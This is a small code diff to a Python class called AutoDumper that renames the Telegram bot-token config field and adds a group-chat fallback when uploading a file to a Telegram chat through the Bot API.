@@ -734,12 +734,13 @@ class AutoDumper:
                 filename = os.path.basename(file_path)
                 caption = f"📦 {file_type}: {filename}"
                 
-                api_url = f"https://api.telegram.org/bot{self.config.telegram_token}"
+                api_url = f"https://api.telegram.org/bot{self.config.telegram_bot_token}"
+                _chat_id = self.config.telegram_group_id or self.config.telegram_chat_id
                 
                 async with _aiohttp.ClientSession() as upload_session:
                     with open(file_path, 'rb') as f:
                         form = _aiohttp.FormData()
-                        form.add_field('chat_id', str(self.config.telegram_chat_id))
+                        form.add_field('chat_id', str(_chat_id))
                         form.add_field('document', f, filename=filename)
                         form.add_field('caption', caption[:1024])
                         
